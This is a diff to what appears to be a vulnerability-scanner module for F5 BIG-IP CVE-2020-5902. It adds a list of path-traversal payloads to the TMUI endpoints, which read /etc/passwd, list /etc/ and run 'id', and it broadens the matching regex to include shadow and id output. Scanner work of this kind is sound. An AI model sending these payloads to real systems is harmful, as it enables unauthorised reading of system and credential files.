@@ -9,7 +9,8 @@ info:
     - vulnerability
     - http
     - critical_severity
-    - f5_cve_2020_5902
+    - cve
+    - f5
 
 payloads:
   - library: http
@@ -24,11 +25,15 @@ payloads:
           User-Agent: "{user_agent}"
         url:
           nettacker_fuzzer:
-            input_format: "{{schema}}://{target}:{{ports}}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
+            input_format: "{{schema}}://{target}:{{ports}}/{{paths}}"
             prefix: ""
             suffix: ""
             interceptors:
             data:
+              paths:
+                - "tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
+                - "tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/etc/"
+                - "tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=id"
               schema:
                 - "http"
                 - "https"
@@ -42,5 +47,5 @@ payloads:
               regex: "200"
               reverse: false
             content:
-              regex: "root:.*:0:0:"
+              regex: root:.*:0:0:|/etc/passwd|/etc/shadow|uid\\=*.+gid
               reverse: false
